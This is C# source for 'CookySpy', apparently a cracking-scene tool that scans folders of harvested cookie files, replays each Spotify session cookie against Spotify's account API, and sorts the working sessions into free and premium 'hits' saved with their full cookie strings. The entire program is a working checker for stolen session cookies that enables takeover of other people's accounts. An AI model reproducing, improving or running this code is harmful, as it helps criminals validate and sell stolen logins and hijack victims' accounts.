using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.CompilerServices;

class Program
{
    static async Task Main()
    {
        Banner();
        Console.Title = $"CookySpy by @SaidosHits | Mode Select";

        Console.Write(" [>] Please Write path of the root folder:  ");
         string Path = Console.ReadLine();
       
      

        if (Directory.Exists(Path))
        {
           
            var search = Directory.GetFiles(Path, "Cookies*.txt", SearchOption.AllDirectories);
            int coofiles = search.Length;
            Console.WriteLine("");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($" [+] Cookies File Founded [{coofiles}]");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(" [*] Press any key to start the Magic !");
            Console.WriteLine("");
            Console.ReadKey();
            await checker(Path , coofiles);  // Ensure calling the checker function asynchronously
            Console.ResetColor();
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("");
            Console.WriteLine("");
            Console.WriteLine(" [*] THE PATH IS NOT FOUNDED");
            Console.ReadLine();
            Console.ResetColor();
            Environment.Exit(0);
        }
        Console.ForegroundColor= ConsoleColor.Green;
        Console.WriteLine("");
        Console.WriteLine("");
        Console.WriteLine(" [>] Saving results...");
        SaveResults(); // Call the method to save results
        Console.WriteLine(" [>] Done");
        Console.ReadKey();
        Environment.Exit(0);
    }
    static int file_checked = 0;
    static void Banner()
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine(@"                                         

     ______    ______      ______    __   ___  ___  ___  ________  _______  ___  ___  
    /"" _  ""\  /    "" \    /    "" \  |/""| /  "")|""  \/""  |/""       )|   __ ""\|""  \/""  | 
   (: ( \___)// ____  \  // ____  \ (: |/   /  \   \  /(:   \___/ (. |__) :)\   \  /  
    \/ \    /  /    ) :)/  /    ) :)|    __/    \\  \/  \___  \   |:  ____/  \\  \/   
    //  \ _(: (____/ //(: (____/ // (// _  \    /   /    __/  \\  (|  /      /   /    
   (:   _) \\        /  \        /  |: | \  \  /   /    /"" \   :)/|__/ \    /   /     
    \_______)\""_____/    \""_____/   (__|  \__)|___/    (_______/(_______)  |___/      

                         by @SaidosHits 

");
        Console.ResetColor();
    }

    static async Task checker(string Path , int coofiles)
    {
        var spotifyCookies = new HashSet<string>();

        string[] Search = Directory.GetFiles(Path, "Cookie*.txt", SearchOption.AllDirectories);
        foreach (string file in Search)
        {
            file_checked++;
            var lines = File.ReadAllLines(file);
            foreach (var line in lines)
            {
                if (line.Contains("spotify.com"))
                {
                    spotifyCookies.Add(line);
                }
            }
           

            if (spotifyCookies.Count > 0)
            {
                // Parse the cookies and build the Cookie header
                var cookies = ParseCookies(spotifyCookies);
                string cookieHeader = BuildCookieHeader(cookies);

                // Store the Cookie header in a variable
                string requestCookieHeader = cookieHeader;
               int file_checked = 0 ;
                if (requestCookieHeader.Length >= 2)
                {

                    await SpoCheck(requestCookieHeader , file, coofiles , cookieHeader);
                }
                // Ensure async call here

                // Clear the HashSet after each check
                spotifyCookies.Clear();
            }
        }
    }

    static Dictionary<string, string> ParseCookies(HashSet<string> cookieLines)
    {
        var cookies = new Dictionary<string, string>();

        foreach (var line in cookieLines)
        {
            // Split the line into components
            var parts = line.Split('\t');

            // Ensure we have the necessary columns
            if (parts.Length >= 7)
            {
                string cookieName = parts[5];  // Cookie name
                string cookieValue = parts[6]; // Cookie value

                // Add the cookie to the dictionary (ignore duplicates by overwriting)
                if (!cookies.ContainsKey(cookieName))
                {
                    cookies[cookieName] = cookieValue;
                }
            }
        }

        return cookies;
    }

    static string BuildCookieHeader(Dictionary<string, string> cookies)
    {
        // Join all cookie name-value pairs into a single string
        return string.Join("; ", cookies.Select(c => $"{c.Key}={c.Value}"));
    }
    static int Free = 0; // Moved as static fields
    static int Premium = 0;
    static HashSet<string> Free_Hits = new HashSet<string>();
    static HashSet<string> Premuim_Hits = new HashSet<string>();
    static async Task SpoCheck(string requestCookieHeader ,string file , int coofiles , string cookieHeader)
    {

        file_checked++;

        string url = "https://www.spotify.com/eg-ar/api/account/v1/datalayer/";

        string cookieValue = $"{requestCookieHeader}";
        
        using (HttpClient client = new HttpClient())
        {
            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);

            // Add Headers
            request.Headers.Add("Host", "www.spotify.com");
            request.Headers.Add("Connection", "keep-alive");
            request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0");
            request.Headers.Add("Accept", "*/*");
            request.Headers.Add("Cookie", cookieValue);
            request.Headers.Add("Accept-Encoding", "gzip, deflate");
          

            HttpResponseMessage response = await client.SendAsync(request);
            if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
            {
                // Do nothing or handle the Unauthorized error in a different way
                return;
            }

            if (response.IsSuccessStatusCode)
            {
                // Read compressed content
                using (Stream responseStream = await response.Content.ReadAsStreamAsync())
                using (GZipStream decompressionStream = new GZipStream(responseStream, CompressionMode.Decompress))
                using (StreamReader reader = new StreamReader(decompressionStream, Encoding.UTF8))
                {
                    string responseBody = reader.ReadToEnd();

                    try
                    {
                        // Parse JSON response
                        var jsonDocument = JsonDocument.Parse(responseBody);
                        string formattedJson = JsonSerializer.Serialize(jsonDocument, new JsonSerializerOptions { WriteIndented = true });
                        var isTrialUser = jsonDocument.RootElement.GetProperty("currentPlan").GetString();
                       

                        if (isTrialUser == "free")
                            
                            {

                            
                                Console.ForegroundColor = ConsoleColor.DarkYellow;
                                Console.WriteLine($" {file}     Found  [" + isTrialUser + "]");
                            Free++;
                           Free_Hits.Add(@$"----------------------------------------------------------------------------------------------------------------------------------
Path: [{file}]
cookies: [{cookieHeader}]  
plane:[{isTrialUser}]  @SaidosHits");

                            Console.ResetColor();
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($" {file}     Found  [" + isTrialUser + "]");
                            Premuim_Hits.Add(@$"----------------------------------------------------------------------------------------------------------------------------------
Path: [{file}]
cookies: [{cookieHeader}]  
plane:[{isTrialUser}]  @SaidosHits");


                            Premium++;
                            Console.ResetColor();
                            }


                        Console.Title = $"CookySpy by @SaidosHits  [Spotify]  Files [{file_checked}/{coofiles}]   |  Free [{Free}] |  Premium [{Premium}]  ";

                    }
                    catch (JsonException ex)
                    {
                        Console.WriteLine("The response is not a valid JSON format:");
                        Console.WriteLine(responseBody);
                        Console.WriteLine($"Error: {ex.Message}");
                    }
                }
            }
            else
            {
                Console.WriteLine($"Error: {response.StatusCode}");
            }
        }
    }
    static void SaveResults()
    {
        string current_location = AppDomain.CurrentDomain.BaseDirectory;
        var current_date = DateTime.Now;
        string folder_name = string.Format("Result {0:[dd.MM.yyyy] [HH.mm.ss]}", current_date);
        Directory.CreateDirectory(folder_name);

        string free_save_file = Path.Combine(folder_name, "Free_Results.txt");
        string premium_save_file = Path.Combine(folder_name, "Premium_Results.txt");

        // Save Free Hits
        using (StreamWriter write = new StreamWriter(free_save_file))
        {
            foreach (var freeHit in Free_Hits)
            {
                write.WriteLine(freeHit);
            }
        }

        // Save Premium Hits
        using (StreamWriter write = new StreamWriter(premium_save_file))
        {
            foreach (var premiumHit in Premuim_Hits)
            {
                write.WriteLine(premiumHit);
            }
        }

     
    }


}
